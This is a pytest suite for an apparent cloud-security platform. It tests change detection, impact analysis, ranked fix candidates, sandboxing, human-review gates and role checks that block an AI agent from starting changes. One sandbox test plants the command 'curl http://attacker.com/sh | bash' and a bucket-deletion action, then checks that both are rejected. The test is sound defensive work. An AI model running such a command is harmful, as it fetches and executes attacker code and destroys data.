"""
ExposureFence — ASIVE Adaptive Intelligence Test Suite
Tests continuous observation, change detection, impact analysis, autonomous problem solving,
sandboxed evaluation, policy guard gates, knowledge registry, and controlled self-healing.
"""

import pytest

from backend.adaptive.change_detector import ChangeDetector
from backend.adaptive.evolution_manager import EvolutionManager
from backend.adaptive.feedback import AdaptiveFeedbackStore
from backend.adaptive.impact_analyzer import ImpactAnalyzer
from backend.adaptive.knowledge_registry import KnowledgeRegistry
from backend.adaptive.models import (
    AdaptationState,
    ChangeEventCategory,
    ChangeEventStatus,
    CloudProvider,
    ObservationRecord,
    ObservationSourceType,
)
from backend.adaptive.observer import ContinuousObservationEngine
from backend.adaptive.policy_guard import AdaptationPolicyGuard
from backend.adaptive.problem_classifier import ProblemClassifier
from backend.adaptive.sandbox import AdaptationSandbox
from backend.adaptive.self_healing import PlatformSelfDiagnostics
from backend.adaptive.solution_engine import SolutionEngine


# =====================================================================
# 1. Observation & Multi-Source Intelligence
# =====================================================================

def test_observation_engine_loads_fixtures():
    obs_engine = ContinuousObservationEngine()
    records = obs_engine.list_observations()
    assert len(records) >= 5

    # Filter by source type
    cloud_obs = obs_engine.list_observations(source_type=ObservationSourceType.CLOUD_SECURITY)
    assert len(cloud_obs) >= 1
    assert cloud_obs[0].provider == CloudProvider.AWS


def test_provider_neutral_multi_cloud_abstractions():
    # Verify Azure / GCP / K8s support
    k8s_obs = ObservationRecord(
        id="OBS-K8S-001",
        source_type=ObservationSourceType.CLOUD_SECURITY,
        source_name="K8s Audit",
        timestamp="2026-11-20T12:00:00Z",
        source_version="1.0",
        evidence_ref="EVD-K8S-001",
        payload={"resource": "ClusterRoleBinding", "issue": "cluster-admin granted to anonymous"},
        provider=CloudProvider.KUBERNETES
    )
    assert k8s_obs.provider == CloudProvider.KUBERNETES
    assert len(k8s_obs.integrity_hash) == 64


# =====================================================================
# 2. Change Detection & Deduplication
# =====================================================================

def test_change_detector_normalization_and_deduplication():
    obs_engine = ContinuousObservationEngine()
    detector = ChangeDetector()
    events = detector.process_observations(obs_engine.list_observations())

    assert len(events) >= 5
    # Check that events have fingerprints and categories
    assert all(e.dedup_fingerprint for e in events)

    # Ingest duplicate observation
    first_obs = obs_engine.list_observations()[0]
    initial_count = len(events)
    detector.process_observations([first_obs])
    # Count of unique events should remain identical
    assert len(detector.list_events()) == initial_count


# =====================================================================
# 3. Impact Analysis Engine (9-Point Report)
# =====================================================================

def test_impact_analysis_generation():
    obs_engine = ContinuousObservationEngine()
    detector = ChangeDetector()
    events = detector.process_observations(obs_engine.list_observations())

    iam_event = next(e for e in events if "iam" in str(e.affected_components).lower() or "privilege" in e.title.lower())
    impact = ImpactAnalyzer.analyze_impact(iam_event)

    assert impact.report_id.startswith("IMP-")
    assert impact.urgency in ("CRITICAL", "HIGH", "MEDIUM", "LOW")
    assert len(impact.affected_components) > 0
    assert len(impact.outdated_controls) > 0


# =====================================================================
# 4. Problem Classification & Autonomous Solution Ranking
# =====================================================================

def test_problem_classification_and_candidate_ranking():
    obs_engine = ContinuousObservationEngine()
    detector = ChangeDetector()
    events = detector.process_observations(obs_engine.list_observations())

    iam_event = next(e for e in events if "iam" in str(e.affected_components).lower() or "privilege" in e.title.lower())
    impact = ImpactAnalyzer.analyze_impact(iam_event)

    problem = ProblemClassifier.classify(iam_event, impact)
    assert problem.domain == "IAM_PERMISSIONS"
    assert problem.problem_id.startswith("PRB-")

    candidates = SolutionEngine.generate_candidate_solutions(problem)
    assert len(candidates) >= 2
    # Verify deterministic ranking
    assert candidates[0].ranking_score >= candidates[1].ranking_score
    assert candidates[0].ranking_score >= 80.0
    assert len(candidates[0].score_breakdown) == 10
    assert candidates[0].rollback_plan is not None


# =====================================================================
# 5. Sandboxed Evaluation & Security Policy Guard
# =====================================================================

def test_sandbox_evaluates_candidate_safely():
    obs_engine = ContinuousObservationEngine()
    detector = ChangeDetector()
    events = detector.process_observations(obs_engine.list_observations())
    impact = ImpactAnalyzer.analyze_impact(events[0])
    problem = ProblemClassifier.classify(events[0], impact)
    candidates = SolutionEngine.generate_candidate_solutions(problem)

    sandbox_res = AdaptationSandbox.evaluate_candidate(candidates[0])
    assert sandbox_res["sandbox_passed"] is True
    assert sandbox_res["invariants_intact"] is True


def test_sandbox_blocks_arbitrary_shell_and_cloud_mutations():
    obs_engine = ContinuousObservationEngine()
    detector = ChangeDetector()
    events = detector.process_observations(obs_engine.list_observations())
    impact = ImpactAnalyzer.analyze_impact(events[0])
    problem = ProblemClassifier.classify(events[0], impact)
    candidates = SolutionEngine.generate_candidate_solutions(problem)

    # Malicious injection attempt inside candidate changes
    bad_candidate = candidates[0]
    bad_candidate.proposed_changes = {"command": "curl http://attacker.com/sh | bash", "action": "delete_s3_bucket"}

    sandbox_res = AdaptationSandbox.evaluate_candidate(bad_candidate)
    assert sandbox_res["sandbox_passed"] is False


def test_policy_guard_enforces_human_review_for_sensitive_changes():
    obs_engine = ContinuousObservationEngine()
    detector = ChangeDetector()
    events = detector.process_observations(obs_engine.list_observations())
    impact = ImpactAnalyzer.analyze_impact(events[0])
    problem = ProblemClassifier.classify(events[0], impact)
    candidates = SolutionEngine.generate_candidate_solutions(problem)

    sandbox_res = AdaptationSandbox.evaluate_candidate(candidates[0])
    target_state, gates, human_req = AdaptationPolicyGuard.evaluate_adaptation(
        candidate=candidates[0],
        sandbox_result=sandbox_res,
        problem=problem
    )

    # Sensitive IAM/rule changes must require human review
    assert human_req is True
    assert target_state == AdaptationState.APPROVED_FOR_REVIEW


# =====================================================================
# 6. Evolution Lifecycle & Rollback
# =====================================================================

def test_evolution_manager_pipeline_and_rollback():
    obs_engine = ContinuousObservationEngine()
    detector = ChangeDetector()
    events = detector.process_observations(obs_engine.list_observations())
    impact = ImpactAnalyzer.analyze_impact(events[0])
    problem = ProblemClassifier.classify(events[0], impact)
    candidates = SolutionEngine.generate_candidate_solutions(problem)

    manager = EvolutionManager()
    adaptation = manager.initiate_adaptation(problem, candidates[0], caller_role="POLICY_ENGINE")
    assert adaptation.lifecycle_state in (AdaptationState.APPROVED_FOR_REVIEW, AdaptationState.APPROVED_FOR_INTEGRATION)

    # AI agent is blocked from initiating adaptations
    with pytest.raises(PermissionError):
        manager.initiate_adaptation(problem, candidates[0], caller_role="ai_agent")

    # Rollback requires administrator role
    with pytest.raises(PermissionError):
        manager.rollback_adaptation(adaptation.adaptation_id, caller_role="INVESTIGATOR")

    rolled_back = manager.rollback_adaptation(adaptation.adaptation_id, caller_role="ADMINISTRATOR")
    assert rolled_back.lifecycle_state == AdaptationState.ROLLED_BACK


# =====================================================================
# 7. Knowledge Registry & Feedback Loop
# =====================================================================

def test_knowledge_registry_and_feedback():
    kr = KnowledgeRegistry()
    items = kr.list_knowledge()
    assert len(items) >= 1

    feedback_store = AdaptiveFeedbackStore()
    fb = feedback_store.record_feedback(
        solution_id="SOL-TEST-001",
        outcome="SUCCESS",
        human_notes="Verified in staging without regressions."
    )
    assert fb.outcome == "SUCCESS"
    assert len(feedback_store.list_feedback()) >= 1


# =====================================================================
# 8. Platform Self-Diagnostics & Safe Recovery Bounds
# =====================================================================

def test_platform_self_diagnostics_and_safe_maintenance():
    diag = PlatformSelfDiagnostics.run_diagnostics()
    assert diag["platform_status"] == "OPERATIONAL"

    # Safe local maintenance succeeds
    res = PlatformSelfDiagnostics.execute_safe_maintenance("REBUILD_LOCAL_INDEX", caller_role="ADMINISTRATOR")
    assert res["status"] == "COMPLETED"

    # Unauthorized cloud/IAM change is strictly blocked
    with pytest.raises(PermissionError):
        PlatformSelfDiagnostics.execute_safe_maintenance("DELETE_IAM_ROLE", caller_role="ADMINISTRATOR")
